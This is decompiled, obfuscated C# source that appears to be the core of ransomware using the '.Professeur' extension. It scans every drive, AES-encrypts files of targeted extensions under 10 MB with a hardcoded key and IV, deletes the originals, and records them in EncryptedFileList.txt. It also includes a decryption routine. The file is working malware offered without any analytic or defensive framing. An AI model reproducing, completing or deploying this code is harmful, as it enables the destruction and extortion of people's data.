using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;

namespace ns0;

internal static class Class8
{
	[CompilerGenerated]
	private sealed class Class10
	{
		public HashSet<string> hashSet_0;

		public Func<string, IEnumerable<string>> func_0;

		internal IEnumerable<string> method_0(string string_0)
		{
			return hashSet_0;
		}
	}

	private static readonly string string_0 = Path.Combine(Class2.string_12, "EncryptedFileList.txt");

	private static readonly HashSet<string> hashSet_0 = new HashSet<string>();

	private static string string_1;

	private static string string_2;

	internal static void smethod_0()
	{
		HashSet<string> hashSet_ = new HashSet<string>(smethod_3());
		foreach (string item in from driveInfo_0 in DriveInfo.GetDrives()
			select driveInfo_0.RootDirectory.FullName)
		{
			smethod_5(item, ".Professeur", hashSet_);
		}
		if (!File.Exists(string_0))
		{
			string[] contents = hashSet_0.ToArray();
			File.WriteAllLines(string_0, contents);
		}
	}

	internal static HashSet<string> smethod_1()
	{
		HashSet<string> hashSet = new HashSet<string>();
		if (File.Exists(string_0))
		{
			string[] array = File.ReadAllLines(string_0);
			foreach (string item in array)
			{
				hashSet.Add(item);
			}
		}
		return hashSet;
	}

	private static string smethod_2()
	{
		string text = Path.Combine(Class2.string_12, "FileSystemSimulation");
		if (!Directory.Exists(text))
		{
			Directory.CreateDirectory(text);
		}
		using (TextWriter textWriter = new StreamWriter(Path.Combine(text, "TxtTest.txt"), append: true))
		{
			textWriter.WriteLine("I am a txt test.");
		}
		using TextWriter textWriter2 = new StreamWriter(Path.Combine(text, "NotTxtTest.nottxt"), append: true);
		textWriter2.WriteLine("I am NOT a txt test.");
		return text;
	}

	private static IEnumerable<string> smethod_3()
	{
		HashSet<string> hashSet = new HashSet<string>();
		foreach (string item in Class4.ExtensionsToEncrypt.Split(new string[2]
		{
			Environment.NewLine,
			" "
		}, StringSplitOptions.RemoveEmptyEntries).ToList())
		{
			hashSet.Add(item.Trim());
		}
		hashSet.Remove(".Professeur");
		return hashSet;
	}

	private static IEnumerable<string> smethod_4(string string_3)
	{
		Queue<string> queue = new Queue<string>();
		queue.Enqueue(string_3);
		while (queue.Count > 0)
		{
			string_3 = queue.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(string_3);
				foreach (string item in directories)
				{
					queue.Enqueue(item);
				}
			}
			catch (Exception value)
			{
				Console.Error.WriteLine(value);
			}
			string[] array = null;
			try
			{
				array = Directory.GetFiles(string_3);
			}
			catch (Exception value2)
			{
				Console.Error.WriteLine(value2);
			}
			if (array != null)
			{
				string[] array2 = array;
				for (int j = 0; j < array2.Length; j++)
				{
					yield return array2[j];
				}
			}
		}
	}

	private static void smethod_5(string string_3, string string_4, HashSet<string> hashSet_1)
	{
		foreach (string item in from string_0 in smethod_4(string_3)
			from string_1 in hashSet_1
			select new Class0<string, string>(string_0, string_1) into class0_0
			where class0_0.file.EndsWith(class0_0.ext)
			select class0_0.file into string_0
			select new Class1<string, FileInfo>(string_0, new FileInfo(string_0)) into class1_0
			where class1_0.fi.Length < 10000000
			select class1_0.file)
		{
			try
			{
				if (smethod_7(item, string_4))
				{
					hashSet_0.Add(item);
				}
			}
			catch
			{
			}
		}
	}

	internal static void smethod_6(string string_3)
	{
		foreach (string item in smethod_1())
		{
			try
			{
				string text = item + string_3;
				smethod_8(text, string_3);
				File.Delete(text);
			}
			catch
			{
			}
		}
		File.Delete(string_0);
	}

	private static bool smethod_7(string string_3, string string_4)
	{
		try
		{
			if (Class2.enum0_0 != 0 && (string_3.StartsWith(Class2.string_12, StringComparison.InvariantCulture) || string_3.StartsWith("C:\\Windows", StringComparison.InvariantCultureIgnoreCase)))
			{
				return false;
			}
			using AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
			aesCryptoServiceProvider.Key = Convert.FromBase64String("OoIsAwwF32cICQoLDA0ODe==");
			aesCryptoServiceProvider.IV = new byte[16]
			{
				0, 1, 0, 3, 5, 3, 0, 1, 0, 0,
				2, 0, 6, 7, 6, 0
			};
			smethod_9(aesCryptoServiceProvider, string_3, string_3 + string_4);
		}
		catch
		{
			return false;
		}
		try
		{
			File.Delete(string_3);
		}
		catch (Exception)
		{
			return false;
		}
		return true;
	}

	private static void smethod_8(string string_3, string string_4)
	{
		try
		{
			if (!string_3.EndsWith(string_4))
			{
				return;
			}
			string string_5 = string_3.Remove(string_3.Length - 4);
			using AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
			aesCryptoServiceProvider.Key = Convert.FromBase64String("OoIsAwwF32cICQoLDA0ODe==");
			aesCryptoServiceProvider.IV = new byte[16]
			{
				0, 1, 0, 3, 5, 3, 0, 1, 0, 0,
				2, 0, 6, 7, 6, 0
			};
			smethod_10(aesCryptoServiceProvider, string_3, string_5);
		}
		catch
		{
			return;
		}
		try
		{
			File.Delete(string_3);
		}
		catch (Exception)
		{
		}
	}

	private static void smethod_9(SymmetricAlgorithm symmetricAlgorithm_0, string string_3, string string_4)
	{
		byte[] array = new byte[65536];
		using FileStream fileStream = new FileStream(string_3, FileMode.Open);
		using FileStream stream = new FileStream(string_4, FileMode.Create);
		using CryptoStream cryptoStream = new CryptoStream(stream, symmetricAlgorithm_0.CreateEncryptor(), CryptoStreamMode.Write);
		int num;
		do
		{
			num = fileStream.Read(array, 0, array.Length);
			if (num != 0)
			{
				cryptoStream.Write(array, 0, num);
			}
		}
		while (num != 0);
	}

	private static void smethod_10(SymmetricAlgorithm symmetricAlgorithm_0, string string_3, string string_4)
	{
		byte[] array = new byte[65536];
		using FileStream fileStream = new FileStream(string_3, FileMode.Open);
		using FileStream stream = new FileStream(string_4, FileMode.Create);
		using CryptoStream cryptoStream = new CryptoStream(stream, symmetricAlgorithm_0.CreateDecryptor(), CryptoStreamMode.Write);
		int num;
		do
		{
			num = fileStream.Read(array, 0, array.Length);
			if (num != 0)
			{
				cryptoStream.Write(array, 0, num);
			}
		}
		while (num != 0);
	}
}
